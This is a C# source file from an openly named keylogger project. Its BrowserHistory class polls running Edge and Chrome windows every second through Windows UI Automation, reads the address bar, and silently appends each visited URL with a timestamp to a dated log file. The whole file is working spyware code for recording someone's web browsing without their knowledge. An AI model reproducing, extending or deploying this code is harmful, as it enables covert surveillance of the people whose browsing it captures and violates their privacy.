using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Automation;
using System.Windows.Forms;

namespace KeyLoggerVersion1._0
{
    #region Thank to direction for me 
    //Source: https://social.msdn.microsoft.com/Forums/office/en-US/0724974a-1836-42c1-a368-dc05f1f098b7/how-to-get-msedge-history-with-c?forum=csharpgeneral
    #endregion
    public class BrowserItem
    {
        public string BrowserName { get; set; }
        public string Url { get; set; }
        public string TimeEx { get; set; }
    }
    public class BrowserHistory
    {
        private static BrowserHistory _Instance;

        public static BrowserHistory Instance
        {
            get
            {
                if (_Instance == null)
                {
                    _Instance = new BrowserHistory();
                }
                return _Instance;
            }
            private set
            {

            }
        }
        public BrowserHistory() { }

        public Thread ThreadEdge;
        public Thread ThreadChrome;

        List<BrowserItem> bi = new List<BrowserItem>();

        public void ClearList()
        {
            bi.Clear();
        }
        public bool ListAndCheck(BrowserItem a)
        {
            bool check = false;
            bi.Add(a);
            if (bi.Count == 1) check = true;
            else
            {
                var duplicateExists = bi.Where(x => x.BrowserName == a.BrowserName && x.Url == a.Url).Count();
                if (duplicateExists > 1)
                {
                    check = false;
                }
                else
                {
                    check = true;
                }
            }
            return check;
        }
        public void GetEdgeUrl()
        {
            Console.OutputEncoding = System.Text.Encoding.UTF8;
            while (API.appActive)
            {
                try
                {
                    Process[] processEdge = Process.GetProcessesByName("msedge");
                    if (processEdge.Length <= 0)
                    {
                        //Console.WriteLine("Edge is not working ...");
                    }
                    foreach (Process proc in processEdge)
                    {
                        if (proc.MainWindowHandle == IntPtr.Zero)
                            continue;

                        AutomationElement root = AutomationElement.FromHandle(proc.MainWindowHandle);
                        var SearchBar = root.FindFirst(TreeScope.Descendants, new PropertyCondition(AutomationElement.NameProperty, "Address and search bar"));
                        Dictionary<string, string> dictionary = new Dictionary<string, string>();
                        if (!Directory.Exists(API.SaveLogFileText))
                        {
                            Directory.CreateDirectory(API.SaveLogFileText);
                        }
                        string path = API.SaveLogFileText + "/HistoryBrowser" + " " + DateTime.Now.ToString("dd-MM-yyyy");
                        using (StreamWriter sw = (File.Exists(path)) ? File.AppendText(path) : File.CreateText(path))
                        {
                            if (SearchBar != null)
                            {
                                dictionary["BrowserName"] = "Microsoft Edge";
                                dictionary["Url"] = (string)SearchBar.GetCurrentPropertyValue(ValuePatternIdentifiers.ValueProperty);
                                dictionary["TimeEx"] = DateTime.Now.ToString("dd-MM-yyyy hh::mm::ss tt");
                                string Browserst = "";
                                if (dictionary["Url"] == "")
                                {
                                    Browserst = dictionary["BrowserName"] + " " + dictionary["TimeEx"] + " " + "New Tab";
                                }
                                else
                                {
                                    Browserst = dictionary["BrowserName"] + " " + dictionary["TimeEx"] + " " + dictionary["Url"];
                                }
                                BrowserItem bri = new BrowserItem { BrowserName = dictionary["BrowserName"], Url = dictionary["Url"], TimeEx = dictionary["TimeEx"] };
                                if (ListAndCheck(bri) == true)
                                {
                                    //Console.WriteLine();
                                    //Console.WriteLine(Browserst);
                                    sw.WriteLine("\n" + Browserst);
                                }
                            }
                        }
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                }
                Thread.Sleep(1000);
            }
        }
        public void GetUrlChrome()
        {
            Console.OutputEncoding = System.Text.Encoding.UTF8;
            while (API.appActive)
            {
                try
                {
                    Process[] processChrome = Process.GetProcessesByName("chrome");
                    if (processChrome.Length <= 0)
                    {
                        //Console.WriteLine("Edge is not working ...");
                    }
                    foreach (Process proc in processChrome)
                    {
                        if (proc.MainWindowHandle == IntPtr.Zero)
                            continue;

                        AutomationElement root = AutomationElement.FromHandle(proc.MainWindowHandle);
                        var SearchBar = root.FindFirst(TreeScope.Descendants, new PropertyCondition(AutomationElement.NameProperty, "Address and search bar"));
                        Dictionary<string, string> dictionary = new Dictionary<string, string>();
                        if (!Directory.Exists(API.SaveLogFileText))
                        {
                            Directory.CreateDirectory(API.SaveLogFileText);
                        }
                        string path = API.SaveLogFileText + "/HistoryBrowser" + " " + DateTime.Now.ToString("dd-MM-yyyy");
                        using (StreamWriter sw = (File.Exists(path)) ? File.AppendText(path) : File.CreateText(path))
                        {
                            if (SearchBar != null)
                            {
                                dictionary["BrowserName"] = "Google Chrome";
                                dictionary["Url"] = (string)SearchBar.GetCurrentPropertyValue(ValuePatternIdentifiers.ValueProperty);
                                dictionary["TimeEx"] = DateTime.Now.ToString("dd-MM-yyyy hh::mm::ss tt");
                                string Browserst = "";
                                if (dictionary["Url"] == "")
                                {
                                    Browserst = dictionary["BrowserName"] + " " + dictionary["TimeEx"] + " " + "New Tab";
                                }
                                else
                                {
                                    Browserst = dictionary["BrowserName"] + " " + dictionary["TimeEx"] + " " + dictionary["Url"];
                                }
                                BrowserItem bri = new BrowserItem { BrowserName = dictionary["BrowserName"], Url = dictionary["Url"], TimeEx = dictionary["TimeEx"] };
                                if (ListAndCheck(bri) == true)
                                {
                                    //Console.WriteLine();
                                    //Console.WriteLine(Browserst);
                                    sw.WriteLine("\n" + Browserst);
                                }
                            }
                        }
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                }
                Thread.Sleep(1000);
            }
        }
        public BrowserItem GetCurrentBrowserItem()
        {
            return bi[bi.Count - 1];
        }
    }
}
